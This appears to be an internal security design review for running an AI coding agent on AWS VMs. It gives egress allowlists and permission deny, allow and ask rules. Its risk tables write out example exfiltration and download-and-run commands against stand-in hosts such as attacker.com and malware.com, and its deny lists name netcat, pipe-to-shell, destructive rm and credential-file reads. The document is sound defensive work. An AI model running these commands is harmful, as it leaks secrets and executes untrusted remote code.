# Axiom Research: Claude Code Enterprise Security

**Cycle:** 3
**Status:** Ready for Security Review
**Last Updated:** 2026-01-15
**Lead:** Thesis | **Coordinator:** Proof

---

## Executive Summary

This revision addresses additional requirements from stakeholder feedback:

1. **AWS-only deployment** - All Claude Code instances run on Linux VMs in AWS VPC (no local workstations)
2. **Cloud service integration** - Verified compatibility with GitLab, Jira, Atlassian cloud services
3. **Command restriction analysis** - Comprehensive reasoning for each blocked command with risk assessment
4. **Workflow accommodation** - Secure patterns for necessary commands (curl, wget, ssh)

---

## ARCHITECTURE UPDATE: AWS-Only Deployment

### Deployment Model Change

| Previous Model | New Model |
|----------------|-----------|
| Developer workstation (local) | EC2 instance in AWS VPC |
| Optional cloud VM | **Mandatory** cloud VM |
| Mixed local/cloud | Cloud-only |

### Rationale for AWS-Only

| Benefit | Description |
|---------|-------------|
| Network Control | All traffic flows through AWS network controls (DNS Firewall, Network Firewall) |
| Consistent Enforcement | No variance in security posture across developer machines |
| Session Recording | AWS SSM provides built-in session recording |
| Ephemeral Option | Instances can be destroyed/recreated for maximum isolation |
| Audit Trail | CloudTrail provides comprehensive AWS-level audit |
| No Local Data | Sensitive data never resides on developer laptops |

### Updated Architecture Diagram

```
┌────────────────────────────────────────────────────────────────────────────────┐
│                            AWS ACCOUNT                                          │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────────────┐ │
│  │                         CLAUDE CODE VPC                                   │ │
│  │                                                                           │ │
│  │  ┌─────────────────────────────────────────────────────────────────────┐ │ │
│  │  │                    PRIVATE SUBNET                                    │ │ │
│  │  │                                                                      │ │ │
│  │  │  ┌───────────────────────────────────────────────────────────────┐ │ │ │
│  │  │  │           EC2: CLAUDE CODE INSTANCE                           │ │ │ │
│  │  │  │                                                               │ │ │ │
│  │  │  │  ┌─────────────┐  ┌─────────────┐  ┌────────────────────┐   │ │ │ │
│  │  │  │  │ Claude Code │  │ bubblewrap  │  │ managed-settings   │   │ │ │ │
│  │  │  │  │ CLI         │  │ sandbox     │  │ .json              │   │ │ │ │
│  │  │  │  └─────────────┘  └─────────────┘  └────────────────────┘   │ │ │ │
│  │  │  │                                                               │ │ │ │
│  │  │  │  ┌─────────────┐  ┌─────────────┐  ┌────────────────────┐   │ │ │ │
│  │  │  │  │ PreToolUse  │  │ Lakera      │  │ Audit Hooks        │   │ │ │ │
│  │  │  │  │ Hooks       │  │ Guard       │  │ → Kinesis          │   │ │ │ │
│  │  │  │  └─────────────┘  └─────────────┘  └────────────────────┘   │ │ │ │
│  │  │  │                                                               │ │ │ │
│  │  │  │  Access: AWS SSM Session Manager (no SSH required)           │ │ │ │
│  │  │  │  No public IP, no inbound ports open                         │ │ │ │
│  │  │  └───────────────────────────────────────────────────────────────┘ │ │ │
│  │  │                              │                                      │ │ │
│  │  └──────────────────────────────┼──────────────────────────────────────┘ │ │
│  │                                 │                                         │ │
│  │  ┌──────────────────────────────▼──────────────────────────────────────┐ │ │
│  │  │                    NETWORK CONTROLS                                  │ │ │
│  │  │                                                                      │ │ │
│  │  │  Route 53 DNS Firewall ──► AWS Network Firewall ──► NAT Gateway    │ │ │
│  │  │                                                                      │ │ │
│  │  │  Allowlist: api.anthropic.com, *.amazonaws.com                      │ │ │
│  │  │             gitlab.company.com, *.atlassian.net (see cloud services)│ │ │
│  │  └──────────────────────────────────────────────────────────────────────┘ │ │
│  │                                 │                                         │ │
│  │  ┌──────────────────────────────▼──────────────────────────────────────┐ │ │
│  │  │                    VPC ENDPOINTS (PrivateLink)                       │ │ │
│  │  │                                                                      │ │ │
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌────────────┐ │ │ │
│  │  │  │ Bedrock     │  │ SSM         │  │ S3          │  │ CloudWatch │ │ │ │
│  │  │  │ Runtime     │  │ (access)    │  │ (logs)      │  │ Logs       │ │ │ │
│  │  │  └─────────────┘  └─────────────┘  └─────────────┘  └────────────┘ │ │ │
│  │  └──────────────────────────────────────────────────────────────────────┘ │ │
│  └──────────────────────────────────────────────────────────────────────────┘ │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────────────┐ │
│  │                    AUDIT INFRASTRUCTURE                                   │ │
│  │                                                                           │ │
│  │  Kinesis Firehose ──► S3 Object Lock (COMPLIANCE) ──► SIEM Integration   │ │
│  │  SSM Session Logs ──► CloudWatch Logs ──► Long-term retention            │ │
│  │  CloudTrail ──► API audit trail                                          │ │
│  └──────────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      │ HTTPS (via NAT + Network Firewall)
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         EXTERNAL SERVICES (Allowlisted)                          │
│                                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐│
│  │ Amazon      │  │ GitLab      │  │ Atlassian   │  │ Package Registries      ││
│  │ Bedrock     │  │ (hosted or  │  │ Cloud       │  │ (npm, pypi, etc.)       ││
│  │             │  │ Dedicated)  │  │ (Jira)      │  │                         ││
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────────────────┘│
└─────────────────────────────────────────────────────────────────────────────────┘

                                      │
                                      │ AWS SSM Session Manager
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         DEVELOPER ACCESS                                         │
│                                                                                  │
│  Developer Workstation (any location)                                           │
│  ├─ No Claude Code installed locally                                            │
│  ├─ Connects via AWS SSM (no SSH keys needed)                                   │
│  ├─ MFA required via IAM Identity Center                                        │
│  └─ All sessions recorded and auditable                                         │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Developer Access Flow

1. Developer authenticates via IAM Identity Center (SSO + MFA)
2. Developer uses AWS SSM Session Manager to connect to EC2 instance
3. SSM connection is encrypted, recorded, and auditable
4. No SSH keys to manage, no inbound ports open
5. Claude Code runs on EC2 with all security controls enforced

---

## CLOUD SERVICE INTEGRATION

### Verified Compatible Services

| Service | Integration Method | Network Requirement |
|---------|-------------------|---------------------|
| **GitLab Dedicated** | AWS PrivateLink | VPC Endpoint (private) |
| **GitLab Self-Hosted** | PrivateLink or allowlist | Company-controlled |
| **GitLab.com** | HTTPS via allowlist | `*.gitlab.com` in Network Firewall |
| **Jira Cloud** | HTTPS via allowlist | `*.atlassian.net`, `*.atlassian.com` |
| **Confluence Cloud** | HTTPS via allowlist | Same as Jira |
| **npm Registry** | HTTPS via allowlist | `registry.npmjs.org` |
| **PyPI** | HTTPS via allowlist | `pypi.org`, `files.pythonhosted.org` |
| **GitHub** | HTTPS via allowlist | `*.github.com`, `*.githubusercontent.com` |

### GitLab Integration Options

**Option A: GitLab Dedicated with PrivateLink (Recommended for high security)**

AWS PrivateLink allows users and applications in your VPC to securely connect to GitLab Dedicated without traffic going over the public internet.

```terraform
# GitLab Dedicated PrivateLink endpoint
resource "aws_vpc_endpoint" "gitlab" {
  vpc_id             = aws_vpc.claude.id
  service_name       = "com.amazonaws.vpce.us-east-1.vpce-svc-GITLAB_SERVICE_ID"
  vpc_endpoint_type  = "Interface"
  subnet_ids         = aws_subnet.private[*].id
  security_group_ids = [aws_security_group.gitlab_endpoint.id]
}
```

**Option B: GitLab Self-Hosted in Same VPC**

If GitLab is self-hosted within AWS, configure internal routing.

**Option C: GitLab.com via Allowlisted Egress**

Add to Network Firewall allowlist:
- `gitlab.com`
- `*.gitlab.com`

### Atlassian (Jira/Confluence) Integration

Atlassian Cloud uses dynamic IP ranges but supports IP allowlisting.

**Configuration:**
1. Add Atlassian domains to Network Firewall allowlist
2. Configure Atlassian IP allowlist to only accept connections from your NAT Gateway IPs
3. Optionally use Atlassian's application tunnels for tighter integration

**Network Firewall Allowlist Addition:**
```
pass tls $HOME_NET any -> $EXTERNAL_NET 443 (tls.sni; content:".atlassian.net"; endswith; sid:10;)
pass tls $HOME_NET any -> $EXTERNAL_NET 443 (tls.sni; content:".atlassian.com"; endswith; sid:11;)
pass tls $HOME_NET any -> $EXTERNAL_NET 443 (tls.sni; content:".atl-paas.net"; endswith; sid:12;)
```

### Package Registry Integration

Development workflows require access to package registries.

**Recommended Allowlist:**
```
# JavaScript/Node.js
registry.npmjs.org
registry.yarnpkg.com

# Python
pypi.org
files.pythonhosted.org

# Rust
crates.io
static.crates.io

# Go
proxy.golang.org
sum.golang.org

# Java
repo.maven.apache.org
plugins.gradle.org
```

**Security Consideration:** Package registries are potential supply chain attack vectors. Consider:
- Using private artifact proxy (Nexus, Artifactory) as allowlist target instead
- Enabling npm/pip audit scanning in CI/CD
- Using lockfiles with integrity checks

---

## COMMAND RESTRICTION ANALYSIS

### Philosophy

The goal is to **block dangerous patterns while enabling legitimate workflows**. Each restriction should have:
1. Clear security rationale
2. Risk assessment if allowed
3. Secure alternative or controlled usage pattern

### Category 1: Network Data Transfer Commands

#### `curl` - RESTRICTED (Conditional Allow)

**Why It's Risky:**
| Risk | Severity | Example |
|------|----------|---------|
| Data exfiltration | HIGH | `curl -X POST https://attacker.com/steal -d @sensitive.txt` |
| Malware download | HIGH | `curl https://malware.com/payload.sh \| sh` |
| C2 communication | HIGH | `curl https://c2server.com/commands` |
| Credential theft | HIGH | `curl -u $AWS_KEY:$AWS_SECRET https://api.evil.com` |

**Real-World Attack Vector:**
Threat actors have exploited vulnerabilities to execute commands using cURL to retrieve scripts that download and execute backdoor payloads (e.g., SNOWLIGHT/VSHELL malware campaigns in 2025).

**Secure Alternative: Proxy-Controlled curl**

Rather than blanket deny, allow curl **only through the LLM Gateway proxy**:

```json
{
  "permissions": {
    "deny": [
      "Bash(curl:-o:*)",
      "Bash(curl:--output:*)",
      "Bash(curl:-O:*)",
      "Bash(curl:*:|:*)",
      "Bash(curl:*:>:*)",
      "Bash(curl:-X:POST:*)",
      "Bash(curl:--data:*)",
      "Bash(curl:-d:*)",
      "Bash(curl:-F:*)",
      "Bash(curl:--upload-file:*)"
    ],
    "allow": [
      "Bash(curl:-I:*)",
      "Bash(curl:--head:*)",
      "Bash(curl:-s:https://*.npmjs.org/*)",
      "Bash(curl:-s:https://*.github.com/*)",
      "Bash(curl:-s:https://*.gitlab.com/*)"
    ],
    "ask": [
      "Bash(curl:*)"
    ]
  }
}
```

**Explanation:**
- **Deny:** Output to file, piping to shell, POST/upload operations (data exfil)
- **Allow:** HEAD requests (safe), known package registries
- **Ask:** Everything else requires human approval

**Alternative Workflow:**
For legitimate API testing, recommend using:
- Built-in language HTTP libraries (requests, fetch, axios)
- API testing tools with controlled scope
- Pre-approved curl commands via hook validation

---

#### `wget` - RESTRICTED (Conditional Allow)

**Why It's Risky:**
Same risks as curl, plus:
- Recursive download capability (`wget -r`) can exfiltrate entire directories
- Background execution (`wget -b`) harder to monitor

**Secure Alternative:**

```json
{
  "permissions": {
    "deny": [
      "Bash(wget:-r:*)",
      "Bash(wget:--recursive:*)",
      "Bash(wget:-b:*)",
      "Bash(wget:--background:*)",
      "Bash(wget:--post-data:*)",
      "Bash(wget:--post-file:*)",
      "Bash(wget:*:|:*)"
    ],
    "allow": [
      "Bash(wget:--spider:*)",
      "Bash(wget:-q:--spider:*)"
    ],
    "ask": [
      "Bash(wget:*)"
    ]
  }
}
```

---

### Category 2: Remote Access Commands

#### `ssh` - RESTRICTED (Conditional Allow)

**Why It's Risky:**
| Risk | Severity | Example |
|------|----------|---------|
| Lateral movement | HIGH | SSH to other systems in network |
| Data exfiltration | HIGH | `ssh user@external scp sensitive.txt` |
| Tunnel creation | HIGH | `ssh -D 8080` (SOCKS proxy) |
| Key theft | HIGH | Access to `~/.ssh/` (blocked by file deny) |

**Modern Alternative: AWS SSM**

In 2025, AWS SSM Session Manager has replaced SSH bastion patterns:
- No SSH keys to manage
- No inbound ports required
- Full session recording
- IAM-based access control

**Secure SSH Pattern (If Required):**

For legitimate cases (e.g., connecting to CI runners, external systems):

```json
{
  "permissions": {
    "deny": [
      "Bash(ssh:-D:*)",
      "Bash(ssh:-R:*)",
      "Bash(ssh:-L:*)",
      "Bash(ssh:-w:*)",
      "Bash(ssh:-N:*)",
      "Bash(ssh:*:rm:*)",
      "Bash(ssh:*:curl:*)",
      "Bash(ssh:*:wget:*)"
    ],
    "ask": [
      "Bash(ssh:*)"
    ]
  }
}
```

**Explanation:**
- **Deny:** Port forwarding (`-D`, `-R`, `-L`), tunnel mode (`-w`, `-N`), remote dangerous commands
- **Ask:** All SSH requires human approval

**Workflow Recommendation:**
1. Document approved SSH destinations in runbook
2. Use SSH certificates instead of keys where possible
3. Require justification in approval prompt
4. Log all approved SSH sessions to SIEM

---

#### `scp` / `rsync` - RESTRICTED

**Why They're Risky:**
- Direct file transfer to external systems
- Bulk data exfiltration capability

**Policy:** Keep in deny list. Use alternative methods:
- Git for code transfer (with PR workflow)
- S3 for approved file sharing (with IAM controls)
- Approved CI/CD pipelines for deployments

---

### Category 3: Privilege Escalation Commands

#### `sudo` - DENIED

**Why It's Risky:**
- Allows any command with root privileges
- Bypasses all user-level controls
- Can disable security tools, modify system files

**Policy:** Absolute deny. No exceptions.

**Alternative:**
- Pre-configure required system capabilities
- Use IAM roles for AWS operations instead of sudo
- Request system changes through proper change management

---

#### `chmod 777` - DENIED

**Why It's Risky:**
- Makes files world-readable/writable/executable
- Security misconfiguration leading to privilege escalation

**Policy:** Deny 777. Allow specific chmod with ask:

```json
{
  "permissions": {
    "deny": [
      "Bash(chmod:777:*)",
      "Bash(chmod:666:*)",
      "Bash(chmod:-R:777:*)"
    ],
    "ask": [
      "Bash(chmod:+x:*)",
      "Bash(chmod:*)"
    ]
  }
}
```

---

### Category 4: Destructive Commands

#### `rm -rf /` - DENIED

**Policy:** Absolute deny. No recovery possible.

```json
{
  "deny": [
    "Bash(rm:-rf:/*)",
    "Bash(rm:-rf:~/*)",
    "Bash(rm:-rf:.:*)",
    "Bash(rm:-rf:../*)"
  ]
}
```

---

#### `git reset --hard` / `git rebase` - RESTRICTED

**Why They're Risky:**
- Can lose uncommitted work
- History modification complicates audit
- Force push can affect team members

**Policy:** Ask for confirmation:

```json
{
  "permissions": {
    "deny": [
      "Bash(git:push:--force:*)",
      "Bash(git:push:-f:*)"
    ],
    "ask": [
      "Bash(git:reset:--hard:*)",
      "Bash(git:rebase:*)"
    ]
  }
}
```

---

### Category 5: Covert Channel Commands

#### `nc` / `ncat` / `netcat` - DENIED

**Why They're Risky:**
- Raw network connections bypass application-level controls
- Classic tool for reverse shells and data exfiltration
- Difficult to audit content

**Policy:** Absolute deny. Use approved tools instead.

---

### Command Restriction Summary Table

| Command | Default | Can Be Enabled | Secure Pattern |
|---------|---------|----------------|----------------|
| `curl` (read) | Ask | Yes | HEAD only, allowlisted domains |
| `curl` (write) | Deny | With controls | Proxy-validated, no piping |
| `wget` (read) | Ask | Yes | Spider mode, allowlisted domains |
| `wget` (write) | Deny | With controls | No recursive, no background |
| `ssh` (basic) | Ask | Yes | No port forwarding, approved hosts |
| `ssh` (tunnel) | Deny | No | Use VPN/SSM instead |
| `scp` | Deny | No | Use S3/git instead |
| `rsync` | Deny | No | Use S3/git instead |
| `sudo` | Deny | No | Pre-configure system |
| `chmod 777` | Deny | No | Use specific permissions |
| `rm -rf /` | Deny | No | Destructive |
| `nc/ncat` | Deny | No | Covert channel |
| `git push -f` | Deny | No | Use PR workflow |
| `git reset --hard` | Ask | Yes | With confirmation |

---

## UPDATED MANAGED-SETTINGS.JSON

Incorporating command restriction analysis:

```json
{
  "env": {
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": 1,
    "HTTPS_PROXY": "http://llm-guard-proxy.internal:8080",
    "NO_PROXY": "169.254.169.254,localhost"
  },
  "cleanupPeriodDays": 1,
  "session": {
    "maxDurationMinutes": 480,
    "idleTimeoutMinutes": 30,
    "requireReauthForSensitiveOps": true,
    "maxConcurrentSessions": 1
  },
  "permissions": {
    "disableBypassPermissionsMode": "disable",
    "defaultMode": "default",

    "deny": [
      "--- FILE ACCESS RESTRICTIONS ---",
      "Read(**/.env)",
      "Read(**/.env.*)",
      "Read(**/*.pem)",
      "Read(**/*.key)",
      "Read(**/*.p12)",
      "Read(**/*.pfx)",
      "Read(**/credentials*)",
      "Read(**/secrets*)",
      "Read(**/.aws/*)",
      "Read(**/.ssh/*)",
      "Read(**/.gnupg/*)",

      "--- PRIVILEGE ESCALATION ---",
      "Bash(sudo:*)",
      "Bash(su:*)",
      "Bash(chmod:777:*)",
      "Bash(chmod:666:*)",
      "Bash(chmod:-R:777:*)",
      "Bash(chown:-R:*:*:/*)",

      "--- COVERT CHANNELS ---",
      "Bash(nc:*)",
      "Bash(ncat:*)",
      "Bash(netcat:*)",
      "Bash(socat:*)",

      "--- DESTRUCTIVE COMMANDS ---",
      "Bash(rm:-rf:/*)",
      "Bash(rm:-rf:~/*)",
      "Bash(rm:-rf:.:*)",
      "Bash(rm:-rf:../*)",
      "Bash(mkfs:*)",
      "Bash(dd:if=*:of=/dev/*)",

      "--- DATA EXFILTRATION (curl) ---",
      "Bash(curl:-o:*)",
      "Bash(curl:--output:*)",
      "Bash(curl:-O:*)",
      "Bash(curl:*:|:sh)",
      "Bash(curl:*:|:bash)",
      "Bash(curl:-X:POST:*)",
      "Bash(curl:--data:*)",
      "Bash(curl:-d:*)",
      "Bash(curl:-F:*)",
      "Bash(curl:--upload-file:*)",

      "--- DATA EXFILTRATION (wget) ---",
      "Bash(wget:-r:*)",
      "Bash(wget:--recursive:*)",
      "Bash(wget:-b:*)",
      "Bash(wget:--background:*)",
      "Bash(wget:--post-data:*)",
      "Bash(wget:--post-file:*)",
      "Bash(wget:*:|:sh)",
      "Bash(wget:*:|:bash)",

      "--- SSH TUNNELING ---",
      "Bash(ssh:-D:*)",
      "Bash(ssh:-R:*)",
      "Bash(ssh:-L:*)",
      "Bash(ssh:-w:*)",
      "Bash(ssh:-N:*)",

      "--- BULK FILE TRANSFER ---",
      "Bash(scp:*)",
      "Bash(rsync:*)",
      "Bash(ftp:*)",
      "Bash(sftp:*)",

      "--- GIT DANGEROUS ---",
      "Bash(git:push:--force:*)",
      "Bash(git:push:-f:*)",
      "Bash(git:commit:--no-verify:*)"
    ],

    "allow": [
      "--- FILE OPERATIONS ---",
      "Read(*)",
      "Glob(*)",
      "Grep(*)",

      "--- GIT (READ) ---",
      "Bash(git:status:*)",
      "Bash(git:diff:*)",
      "Bash(git:log:*)",
      "Bash(git:branch:*)",
      "Bash(git:show:*)",
      "Bash(git:blame:*)",

      "--- GIT (WRITE - LOCAL ONLY) ---",
      "Bash(git:checkout:*)",
      "Bash(git:add:*)",
      "Bash(git:commit:*)",
      "Bash(git:stash:*)",

      "--- BUILD TOOLS ---",
      "Bash(npm:*)",
      "Bash(npx:*)",
      "Bash(node:*)",
      "Bash(yarn:*)",
      "Bash(pnpm:*)",
      "Bash(python:*)",
      "Bash(python3:*)",
      "Bash(pip:*)",
      "Bash(pip3:*)",
      "Bash(pytest:*)",
      "Bash(poetry:*)",
      "Bash(make:*)",
      "Bash(cargo:*)",
      "Bash(go:*)",
      "Bash(gradle:*)",
      "Bash(mvn:*)",
      "Bash(dotnet:*)",

      "--- SAFE CURL (READ-ONLY, ALLOWLISTED) ---",
      "Bash(curl:-I:*)",
      "Bash(curl:--head:*)",
      "Bash(curl:-s:https://registry.npmjs.org/*)",
      "Bash(curl:-s:https://pypi.org/*)",
      "Bash(curl:-s:https://api.github.com/*)",

      "--- SAFE WGET (CHECK-ONLY) ---",
      "Bash(wget:--spider:*)",
      "Bash(wget:-q:--spider:*)",

      "--- SYSTEM INFO (READ-ONLY) ---",
      "Bash(ls:*)",
      "Bash(pwd)",
      "Bash(whoami)",
      "Bash(id)",
      "Bash(uname:*)",
      "Bash(env)",
      "Bash(printenv:*)",
      "Bash(which:*)",
      "Bash(type:*)",
      "Bash(file:*)",
      "Bash(wc:*)",
      "Bash(sort:*)",
      "Bash(uniq:*)",
      "Bash(head:*)",
      "Bash(tail:*)",
      "Bash(less:*)",
      "Bash(more:*)",
      "Bash(cat:*)",
      "Bash(tree:*)",
      "Bash(find:*)",
      "Bash(grep:*)",
      "Bash(awk:*)",
      "Bash(sed:*)",
      "Bash(jq:*)",
      "Bash(yq:*)"
    ],

    "ask": [
      "--- FILE WRITES ---",
      "Write(*)",
      "Edit(*)",

      "--- GIT (REMOTE OPERATIONS) ---",
      "Bash(git:push:*)",
      "Bash(git:pull:*)",
      "Bash(git:fetch:*)",
      "Bash(git:clone:*)",
      "Bash(git:reset:--hard:*)",
      "Bash(git:rebase:*)",

      "--- NETWORK (CONTROLLED) ---",
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(ssh:*)",

      "--- INFRASTRUCTURE ---",
      "Bash(docker:*)",
      "Bash(kubectl:*)",
      "Bash(aws:*)",
      "Bash(terraform:*)",
      "Bash(ansible:*)",

      "--- FILE PERMISSIONS ---",
      "Bash(chmod:*)",
      "Bash(chown:*)",

      "--- PROCESS MANAGEMENT ---",
      "Bash(kill:*)",
      "Bash(pkill:*)"
    ]
  },

  "mcp": {
    "defaultPolicy": "deny",
    "allowlist": []
  }
}
```

---

## NETWORK EGRESS ALLOWLIST (Updated)

Complete allowlist for developer workflows:

```terraform
resource "aws_route53_resolver_firewall_domain_list" "allowed" {
  name = "claude-allowed-domains"
  domains = [
    # Claude/Bedrock
    "api.anthropic.com",
    "*.amazonaws.com",

    # GitLab (choose one based on setup)
    "gitlab.com",
    "*.gitlab.com",
    # OR for self-hosted: "gitlab.company.com"

    # Atlassian
    "*.atlassian.net",
    "*.atlassian.com",
    "*.atl-paas.net",

    # GitHub (if needed)
    "github.com",
    "*.github.com",
    "*.githubusercontent.com",
    "api.github.com",

    # Package Registries
    "registry.npmjs.org",
    "registry.yarnpkg.com",
    "pypi.org",
    "files.pythonhosted.org",
    "crates.io",
    "static.crates.io",
    "proxy.golang.org",
    "sum.golang.org",
    "repo.maven.apache.org",
    "plugins.gradle.org",
    "rubygems.org",
    "api.nuget.org",

    # Documentation (for context lookups)
    "docs.python.org",
    "nodejs.org",
    "developer.mozilla.org"
  ]
}
```

---

## OPEN QUESTIONS FOR CRBRS REVIEW

1. **curl/wget controlled allow:** Is the conditional allow pattern with specific deny rules acceptable, or should these remain fully blocked with ask-all?

2. **SSH with approval:** Is SSH with human approval and no tunneling sufficient, or should SSH be fully blocked in favor of SSM?

3. **Package registry access:** Should we use direct registry access or mandate a private artifact proxy (Nexus/Artifactory)?

4. **GitLab integration:** For GitLab.com (SaaS), is domain allowlisting sufficient, or must we require GitLab Dedicated with PrivateLink?

5. **Additional cloud services:** Are there other SaaS tools (Slack, Teams, etc.) that developers will need that we should address?

---

**AXIOM COMPLETE - CYCLE 3 READY FOR SECURITY REVIEW**
